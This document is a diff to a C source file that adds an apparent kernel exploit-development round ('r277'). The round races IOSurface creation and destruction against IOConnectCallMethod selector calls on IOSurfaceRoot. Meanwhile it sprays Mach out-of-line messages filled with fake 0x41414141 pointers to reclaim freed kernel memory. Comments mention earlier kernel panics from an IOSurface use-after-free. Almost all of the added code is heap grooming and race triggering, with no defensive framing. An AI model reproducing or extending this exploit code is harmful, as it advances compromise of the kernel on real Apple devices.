@@ -1745,6 +1745,336 @@ static volatile int r265_probed = 0;
 
 typedef void* IOSurfaceClientRef;
 
+/* r277: IOConnectCallMethod + surface ID race with high-volume OOL spray.
+ * r276: registry path doesn't touch individual surfaces (0 failures in 238K reads).
+ * This round: use IOConnectCallMethod with surface IDs as scalar input on
+ * the IOSurfaceRootUserClient connection. Race surface destruction with
+ * kernel-side lookups. OOL spray with increased port queue limit (QLIMIT_MAX)
+ * to actually fill freed slots. Try multiple spray sizes to match IOSurface
+ * kernel object size. */
+static volatile int r277_stop = 0;
+static volatile uint64_t r277_call_ok = 0, r277_call_fail = 0;
+static volatile uint64_t r277_creates = 0, r277_destroys = 0;
+
+static void *r277_caller_fn(void *arg) {
+    io_connect_t conn = (io_connect_t)(uintptr_t)arg;
+    uint64_t scalars[4] = {0};
+    uint32_t out_cnt = 0;
+    while (!r277_stop) {
+        for (uint32_t sel = 0; sel < 20; sel++) {
+            scalars[0] = 191;
+            kern_return_t kr = IOConnectCallMethod(conn, sel,
+                scalars, 1, NULL, 0, NULL, &out_cnt, NULL, NULL);
+            if (kr == 0) {
+                __sync_fetch_and_add(&r277_call_ok, 1);
+            } else {
+                __sync_fetch_and_add(&r277_call_fail, 1);
+            }
+            if (r277_stop) break;
+        }
+    }
+    return NULL;
+}
+
+static void *r277_id_caller_fn(void *arg) {
+    struct { io_connect_t conn; volatile uint32_t *target_id; } *ctx = arg;
+    uint64_t scalars[4] = {0};
+    uint32_t out_cnt = 0;
+    uint64_t out_scalars[4] = {0};
+    while (!r277_stop) {
+        uint32_t sid = *ctx->target_id;
+        if (sid == 0) continue;
+        for (uint32_t sel = 0; sel < 20; sel++) {
+            scalars[0] = sid;
+            out_cnt = 4;
+            kern_return_t kr = IOConnectCallMethod(ctx->conn, sel,
+                scalars, 1, NULL, 0, out_scalars, &out_cnt, NULL, NULL);
+            if (kr == 0) {
+                __sync_fetch_and_add(&r277_call_ok, 1);
+            } else {
+                __sync_fetch_and_add(&r277_call_fail, 1);
+            }
+            if (r277_stop) break;
+        }
+    }
+    return NULL;
+}
+
+static void *r277_churner_fn(void *arg) {
+    volatile uint32_t *target_id = (volatile uint32_t *)arg;
+    while (!r277_stop) {
+        CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int w = 64, h = 64, bpe = 4, bpr = w*bpe, pf = 0x42475241, as = bpr*h;
+        CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+        CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+        CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+        CFNumberRef rn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+        CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+        CFNumberRef asn = CFNumberCreate(NULL, kCFNumberIntType, &as);
+        CFDictionarySetValue(p, CFSTR("IOSurfaceWidth"), wn);
+        CFDictionarySetValue(p, CFSTR("IOSurfaceHeight"), hn);
+        CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerElement"), bn);
+        CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerRow"), rn);
+        CFDictionarySetValue(p, CFSTR("IOSurfacePixelFormat"), pfn);
+        CFDictionarySetValue(p, CFSTR("IOSurfaceAllocSize"), asn);
+        CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(rn); CFRelease(pfn); CFRelease(asn);
+        IOSurfaceRef s = IOSurfaceCreate(p);
+        CFRelease(p);
+        if (s) {
+            uint32_t sid = IOSurfaceGetID(s);
+            *target_id = sid;
+            __sync_fetch_and_add(&r277_creates, 1);
+            usleep(1);
+            CFRelease(s);
+            __sync_fetch_and_add(&r277_destroys, 1);
+        }
+    }
+    return NULL;
+}
+
+static void r277_probe(void) {
+    rlog("\n=== r277: IOConnectCallMethod + Surface ID Race with OOL Spray ===\n");
+    fflush(stdout);
+
+    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+        IOServiceMatching("IOSurfaceRoot"));
+    io_connect_t conn = 0;
+    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+    rlog("  IOSurfaceRoot svc=%u conn=%u (open kr=0x%x)\n", svc, conn, kr);
+
+    if (kr != 0 || conn == 0) {
+        rlog("  FAILED to open connection, aborting.\n");
+        IOObjectRelease(svc);
+        return;
+    }
+
+    /* Part 1: Baseline — which selectors accept a surface ID and don't crash? */
+    rlog("\n--- Part 1: Selector baseline with valid surface ID ---\n");
+    {
+        CFMutableDictionaryRef tp = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int tw=64, th=64, tbpe=4, tbpr=64*4, tpf=0x42475241, tas=64*64*4;
+        CFNumberRef twn=CFNumberCreate(NULL,kCFNumberIntType,&tw);
+        CFNumberRef thn=CFNumberCreate(NULL,kCFNumberIntType,&th);
+        CFNumberRef tbn=CFNumberCreate(NULL,kCFNumberIntType,&tbpe);
+        CFNumberRef trn=CFNumberCreate(NULL,kCFNumberIntType,&tbpr);
+        CFNumberRef tpn=CFNumberCreate(NULL,kCFNumberIntType,&tpf);
+        CFNumberRef tan=CFNumberCreate(NULL,kCFNumberIntType,&tas);
+        CFDictionarySetValue(tp,CFSTR("IOSurfaceWidth"),twn);
+        CFDictionarySetValue(tp,CFSTR("IOSurfaceHeight"),thn);
+        CFDictionarySetValue(tp,CFSTR("IOSurfaceBytesPerElement"),tbn);
+        CFDictionarySetValue(tp,CFSTR("IOSurfaceBytesPerRow"),trn);
+        CFDictionarySetValue(tp,CFSTR("IOSurfacePixelFormat"),tpn);
+        CFDictionarySetValue(tp,CFSTR("IOSurfaceAllocSize"),tan);
+        CFRelease(twn);CFRelease(thn);CFRelease(tbn);CFRelease(trn);CFRelease(tpn);CFRelease(tan);
+        IOSurfaceRef test_surf = IOSurfaceCreate(tp);
+        CFRelease(tp);
+        uint32_t sid = IOSurfaceGetID(test_surf);
+        rlog("  test surface id=%u\n", sid);
+
+        for (uint32_t sel = 0; sel < 30; sel++) {
+            uint64_t in_scalars[4] = { sid, 0, 0, 0 };
+            uint64_t out_scalars[4] = {0};
+            uint32_t out_cnt = 4;
+            size_t out_struct_sz = 0;
+            kr = IOConnectCallMethod(conn, sel,
+                in_scalars, 1, NULL, 0,
+                out_scalars, &out_cnt, NULL, &out_struct_sz);
+            if (kr != 0xe00002c2 && kr != 0xe00002c7 && kr != 0xe00002bc) {
+                rlog("  sel%u(id=%u): kr=0x%x out[0]=0x%llx cnt=%u\n",
+                     sel, sid, kr, out_scalars[0], out_cnt);
+            }
+        }
+
+        for (uint32_t sel = 0; sel < 30; sel++) {
+            uint64_t in_scalars[4] = { sid, 0, 0, 0 };
+            uint64_t out_scalars[4] = {0};
+            uint32_t out_cnt = 4;
+            size_t out_struct_sz = 4096;
+            uint8_t out_struct[4096] = {0};
+            kr = IOConnectCallMethod(conn, sel,
+                in_scalars, 2, NULL, 0,
+                out_scalars, &out_cnt, out_struct, &out_struct_sz);
+            if (kr != 0xe00002c2 && kr != 0xe00002c7 && kr != 0xe00002bc
+                && kr != 0xe00002bf) {
+                rlog("  sel%u(id=%u,2args): kr=0x%x out[0]=0x%llx struct_sz=%zu\n",
+                     sel, sid, kr, out_scalars[0], out_struct_sz);
+            }
+        }
+
+        CFRelease(test_surf);
+        fflush(stdout);
+    }
+
+    /* Part 2: OOL spray setup — increase port queue limit */
+    rlog("\n--- Part 2: OOL spray capacity test ---\n");
+    {
+        mach_port_t spray_port;
+        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &spray_port);
+        mach_port_insert_right(mach_task_self(), spray_port, spray_port, MACH_MSG_TYPE_MAKE_SEND);
+
+        mach_port_limits_t limits = { .mpl_qlimit = MACH_PORT_QLIMIT_MAX };
+        mach_port_set_attributes(mach_task_self(), spray_port,
+            MACH_PORT_LIMITS_INFO, (mach_port_info_t)&limits,
+            MACH_PORT_LIMITS_INFO_COUNT);
+
+        struct {
+            mach_msg_header_t hdr;
+            mach_msg_body_t body;
+            mach_msg_ool_descriptor_t ool;
+        } msg;
+
+        int sizes[] = {256, 512, 768, 1024};
+        for (int si = 0; si < 4; si++) {
+            uint8_t *spray_data = calloc(1, sizes[si]);
+            memset(spray_data, 0x41, sizes[si]);
+            uint64_t fake_ptr = 0x4141414141414141ULL;
+            for (int i = 0; i < sizes[si]; i += 8)
+                memcpy(&spray_data[i], &fake_ptr, 8);
+
+            mach_port_t p;
+            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p);
+            mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);
+            mach_port_limits_t lim = { .mpl_qlimit = MACH_PORT_QLIMIT_MAX };
+            mach_port_set_attributes(mach_task_self(), p,
+                MACH_PORT_LIMITS_INFO, (mach_port_info_t)&lim,
+                MACH_PORT_LIMITS_INFO_COUNT);
+
+            int sprayed = 0;
+            for (int i = 0; i < 2000; i++) {
+                msg.hdr.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_MAKE_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
+                msg.hdr.msgh_size = sizeof(msg);
+                msg.hdr.msgh_remote_port = p;
+                msg.hdr.msgh_local_port = MACH_PORT_NULL;
+                msg.hdr.msgh_id = 0x41414141;
+                msg.body.msgh_descriptor_count = 1;
+                msg.ool.address = spray_data;
+                msg.ool.size = sizes[si];
+                msg.ool.deallocate = 0;
+                msg.ool.copy = MACH_MSG_VIRTUAL_COPY;
+                msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+
+                kern_return_t mkr = mach_msg(&msg.hdr, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+                                            sizeof(msg), 0, MACH_PORT_NULL, 1, MACH_PORT_NULL);
+                if (mkr == 0) sprayed++;
+                else break;
+            }
+            rlog("  size=%d: sprayed %d OOL messages (qlimit_max)\n", sizes[si], sprayed);
+            mach_port_destroy(mach_task_self(), p);
+            free(spray_data);
+        }
+        mach_port_destroy(mach_task_self(), spray_port);
+        fflush(stdout);
+    }
+
+    /* Part 3: Race — IOConnectCallMethod(sel, surfID) vs surface churn (5s) */
+    rlog("\n--- Part 3: IOConnectCallMethod + surface churn race (5s) ---\n");
+    {
+        r277_stop = 0;
+        r277_call_ok = 0;
+        r277_call_fail = 0;
+        r277_creates = 0;
+        r277_destroys = 0;
+
+        volatile uint32_t target_id = 0;
+        struct { io_connect_t conn; volatile uint32_t *target_id; } ctx = { conn, &target_id };
+
+        pthread_t churners[2], callers[2];
+        for (int i = 0; i < 2; i++)
+            pthread_create(&churners[i], NULL, r277_churner_fn, (void*)&target_id);
+        for (int i = 0; i < 2; i++)
+            pthread_create(&callers[i], NULL, r277_id_caller_fn, (void*)&ctx);
+
+        sleep(5);
+        r277_stop = 1;
+
+        for (int i = 0; i < 2; i++) pthread_join(churners[i], NULL);
+        for (int i = 0; i < 2; i++) pthread_join(callers[i], NULL);
+
+        rlog("  creates=%llu destroys=%llu\n", r277_creates, r277_destroys);
+        rlog("  call_ok=%llu call_fail=%llu\n", r277_call_ok, r277_call_fail);
+        fflush(stdout);
+    }
+
+    /* Part 4: Race with OOL spray active (5s) */
+    rlog("\n--- Part 4: Race + OOL spray (5s) ---\n");
+    {
+        r277_stop = 0;
+        r277_call_ok = 0;
+        r277_call_fail = 0;
+        r277_creates = 0;
+        r277_destroys = 0;
+
+        mach_port_t spray_ports[4];
+        for (int i = 0; i < 4; i++) {
+            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &spray_ports[i]);
+            mach_port_insert_right(mach_task_self(), spray_ports[i], spray_ports[i], MACH_MSG_TYPE_MAKE_SEND);
+            mach_port_limits_t lim = { .mpl_qlimit = MACH_PORT_QLIMIT_MAX };
+            mach_port_set_attributes(mach_task_self(), spray_ports[i],
+                MACH_PORT_LIMITS_INFO, (mach_port_info_t)&lim,
+                MACH_PORT_LIMITS_INFO_COUNT);
+        }
+
+        struct {
+            mach_msg_header_t hdr;
+            mach_msg_body_t body;
+            mach_msg_ool_descriptor_t ool;
+        } msg;
+
+        int total_sprayed = 0;
+        uint8_t spray_data[512];
+        memset(spray_data, 0x41, sizeof(spray_data));
+        for (int p = 0; p < 4; p++) {
+            for (int i = 0; i < 500; i++) {
+                msg.hdr.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_MAKE_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
+                msg.hdr.msgh_size = sizeof(msg);
+                msg.hdr.msgh_remote_port = spray_ports[p];
+                msg.hdr.msgh_local_port = MACH_PORT_NULL;
+                msg.hdr.msgh_id = 0x41414141;
+                msg.body.msgh_descriptor_count = 1;
+                msg.ool.address = spray_data;
+                msg.ool.size = sizeof(spray_data);
+                msg.ool.deallocate = 0;
+                msg.ool.copy = MACH_MSG_VIRTUAL_COPY;
+                msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+
+                kern_return_t mkr = mach_msg(&msg.hdr, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+                                            sizeof(msg), 0, MACH_PORT_NULL, 1, MACH_PORT_NULL);
+                if (mkr == 0) total_sprayed++;
+            }
+        }
+        rlog("  pre-sprayed %d OOL messages across 4 ports\n", total_sprayed);
+
+        volatile uint32_t target_id = 0;
+        struct { io_connect_t conn; volatile uint32_t *target_id; } ctx = { conn, &target_id };
+
+        pthread_t churners[2], callers[2];
+        for (int i = 0; i < 2; i++)
+            pthread_create(&churners[i], NULL, r277_churner_fn, (void*)&target_id);
+        for (int i = 0; i < 2; i++)
+            pthread_create(&callers[i], NULL, r277_id_caller_fn, (void*)&ctx);
+
+        sleep(5);
+        r277_stop = 1;
+
+        for (int i = 0; i < 2; i++) pthread_join(churners[i], NULL);
+        for (int i = 0; i < 2; i++) pthread_join(callers[i], NULL);
+
+        rlog("  creates=%llu destroys=%llu\n", r277_creates, r277_destroys);
+        rlog("  call_ok=%llu call_fail=%llu\n", r277_call_ok, r277_call_fail);
+
+        for (int i = 0; i < 4; i++)
+            mach_port_destroy(mach_task_self(), spray_ports[i]);
+        fflush(stdout);
+    }
+
+    IOServiceClose(conn);
+    IOObjectRelease(svc);
+    rlog("\n*** r277 probe complete ***\n");
+    fflush(stdout);
+}
+
 /* r276: Controlled sel17/18 race with heap spray.
  * Earlier sessions triggered kernel panics via IOSurface UAF at +0xD8.
  * r275 showed: ID reuse is immediate and aggressive (all 50 IDs = same value).
@@ -24350,6 +24680,14 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 277) {
+            rlog("*** rounds=277: IOConnectCallMethod + Surface ID Race with OOL Spray ***\n");
+            rlog("  r276: registry path clean (0 fail in 238K). Need kernel-side surface lookups.\n");
+            rlog("  Testing: selector baseline, OOL spray capacity, callmethod+churn race.\n\n");
+            fflush(stdout);
+            r277_probe();
             goto done;
         }
         if (rounds == 276) {
